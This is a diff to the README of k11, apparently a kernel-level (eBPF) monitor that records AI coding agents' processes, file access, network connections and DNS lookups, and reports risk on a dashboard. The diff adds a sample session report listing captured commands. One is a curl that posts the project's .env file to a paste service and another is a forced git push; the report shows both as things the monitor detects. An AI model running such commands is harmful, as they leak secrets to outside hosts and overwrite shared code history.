@@ -33,11 +33,17 @@ Ctrl-C reaches the command; when it exits, k11 prints what the session did, for 
 ```
 k11: claude recorded for 12m40s
   processes  41 started, 1 still running: node 88213
+  commands   claude --resume
+             git push --force origin main
+             curl -sS -d @.env 'https://paste.example.net/api?expire=1h'
   files      812 read, 37 written, 2 deleted, 140 only failed
   sensitive  /home/u/proj/.env (read)
   external   api.example.com 203.0.113.10:443 (AS64500 Example)
   risk       medium: sensitive files, external network
 ```
+
+Every session is kept in the record on disk, `/var/log/k11/ocsf.jsonl`.
+`k11 report` lists them; `k11 report last` (or a number) shows one the same way, after the fact.
 
 The dashboard is at http://127.0.0.1:1100.
 The browser `k11` opens it in has control over the watch list and the deny rules, in every tab and across restarts; any other browser is read-only until `k11 dashboard` opens it there.
@@ -55,7 +61,7 @@ k11 records through the kernel, so it runs on the kernel the agent uses.
 - **In a VM:** run k11 inside the VM, as on a host; a VM has its own kernel, out of the host's sight.
 - **In containers:** one daemon on the host sees every container, since they share its kernel.
   Watching `claude` records each one, in any container, including those already running.
-  Events name the container as its runtime does (`podman 3f2a1b9c0d4e`); podman, docker, containerd, CRI-O and LXC are recognized.
+  Events name the container by its runtime and id (podman, docker, containerd, CRI-O, LXC), and by its name and image where the runtime keeps them on disk (podman, rootless too, CRI-O, docker): `podman claude-dev`.
   Paths are as the container sees them.
 
 ---
@@ -67,28 +73,33 @@ Fork lineage is tracked in the kernel, so every event names the tree it belongs 
 
 | Class        | Syscalls |
 |--------------|----------|
-| Process      | `execve[at]` (failed ones too), fork, exit, `ptrace` (attach and writes) |
+| Process      | `execve[at]` with the command line (failed ones too), fork, exit, `ptrace` (attach and writes) |
 | File         | `open`, `openat`, `openat2`, `creat`, `unlink[at]`, `rename[at][2]`, `chmod`, `fchmodat[2]`, `chown`, `lchown`, `fchownat`, `symlink[at]` |
 | Network      | `connect`, `bind`, `listen` |
 | Unix sockets | `connect` |
+| Names        | `getaddrinfo` (glibc, musl), through a probe on each libc: the name asked and what it resolved to |
 
 - Every variant is hooked: glibc on x86_64 uses `rename`, `unlink`, `chmod`; arm64 only has the `*at` forms. Missing variants are skipped.
 - Each record carries pid, uid, comm, the syscall result (fd or errno), and a CLOCK_BOOTTIME timestamp (correct across suspend).
+- An exec keeps its command line, up to 1 KB, as the process passed it: a secret given as an argument is in the record.
+- Event lines name the binary exec found, then the arguments: argv[0] is the caller's choice and cannot pose as another program.
 - One syscall, one record.
 - With the BPF LSM, an open that reaches a file is recorded with the kernel-resolved path: dirfd honoured, symlinks followed, no user-memory race.
 - A filesystem's backing-file opens (overlayfs) and the kernel's own opens during exec are not reported as the process's activity.
 - Relative paths of failed opens and metadata syscalls are made absolute from `/proc`, best effort.
 - A path the process passes from a page it never touched is read again when the syscall returns.
 - Threads are not processes; a process ends with its last thread where the kernel says so (`group_dead`).
+- A connect is named after what the agent looked up (`api.example.com`), not what reverse DNS says of the address.
+- Names are read where libc resolves them: Node, Python, Rust std and most C programs. A static binary resolving on its own (Go) is seen by address only, and a container's first lookups can come before k11 finds its libc.
 
 ---
 
 ## Output
 
-- **OCSF 1.1.0 JSON Lines**, `/var/log/k11/ocsf.jsonl` with the example config.
-  - Process Activity (1007), File System Activity (1001), Network Activity (4001), checked against the schema's required fields.
+- **OCSF 1.1.0 JSON Lines**, `/var/log/k11/ocsf.jsonl` by default (root-only); `k11 report` reads it back.
+  - Process Activity (1007), File System Activity (1001), Network Activity (4001), DNS Activity (4003), checked against the schema's required fields.
   - `metadata.correlation_uid` is `<boot id>:<root pid>`: one session, across daemon restarts.
-  - In a container, the record carries the `container` profile: `container.uid` and `container.runtime`.
+  - In a container, the record carries the `container` profile: `container.uid`, `container.runtime`, and `container.name` and `container.image.name` when known.
   - `metadata.sequence` increases by one per record; a gap is a loss.
   - Risk score and severity per record; the deny-rule outcome as `action_id` and `disposition_id`.
   - Lossless: a slow writer stalls decoding and the kernel ring absorbs it; what the ring cannot is counted and logged.
@@ -97,6 +108,10 @@ Fork lineage is tracked in the kernel, so every event names the tree it belongs 
   - Rotated to `<output>.1` past `export.max_mb` (256 by default).
 - **Dashboard and gRPC API** on `http://127.0.0.1:1100`, served by the daemon (the UI is embedded).
   - Per-agent process trees, file, network and unix tabs, a raw event log.
+  - Notices: an agent reaching a host outside this machine's networks, opening a port to other hosts, touching a sensitive file, matching a deny rule or tracing a process, once per agent and target.
+  - A host is one notice per agent by the name it looked up, however many addresses answer.
+  - A notice that names a file becomes a deny rule in one click; any notice can be quieted (expected: no more notices about that host, address or path), kept like other dashboard changes or set in `notices.quiet`.
+  - Desktop alerts are a toggle, while a dashboard is open.
   - Only loopback `Host` names are served, so a web page cannot reach it through DNS rebinding.
 - **Enrichment**: reverse DNS, GeoIP and ASN (bring your own MaxMind GeoLite2 databases; their license forbids bundling), uid to username.
 
@@ -143,6 +158,7 @@ Releases attach it: a static x86_64 binary with the probe and dashboard inside.
 | Recording                            | Linux 5.8+, tracefs, root or CAP_BPF+PERFMON  | nothing works: the baseline |
 | Process ends with its last thread    | Linux 6.16+ (`group_dead`)                    | a leader leaving first ends the record early |
 | Canonical paths, deny rules          | Linux 5.15+ or RHEL 9, BTF, BPF LSM (`lsm=...,bpf`) | paths as requested; rules refused |
+| Command lines                        | BTF                                           | exec records name the binary only |
 
 Fedora enables the BPF LSM by default; Ubuntu and Debian need `bpf` added to `lsm=` on the kernel command line.
 
@@ -215,7 +231,7 @@ cargo xtask run                 # build, then k11: record and open the dashboard
 ```
 
 `dist/k11.service` is a systemd unit for running the daemon as a service (`/usr/local/bin/k11`, `/etc/k11/k11.toml`).
-For dashboard work with live reload: `cd k11-web && npm run dev` (port 3000, proxies to 1100).
+For dashboard work with live reload: `cd k11-web && npm run dev` (port 3000, proxies to 1100); `/?mock` shows sample data with no daemon.
 `npm run smoke` in `k11-web` checks a running daemon end to end; run it inside a recorded tree.
 
 `cargo xtask vm [--smoke]` is the integration test on a real kernel: it boots the running kernel under qemu (KVM) with k11 as the init's workload and checks the OCSF record. `--kernel` and `--append "lsm=...,bpf"` pick other kernels and LSM setups; `cargo xtask initramfs` builds the image once for `--initramfs`, as CI does.
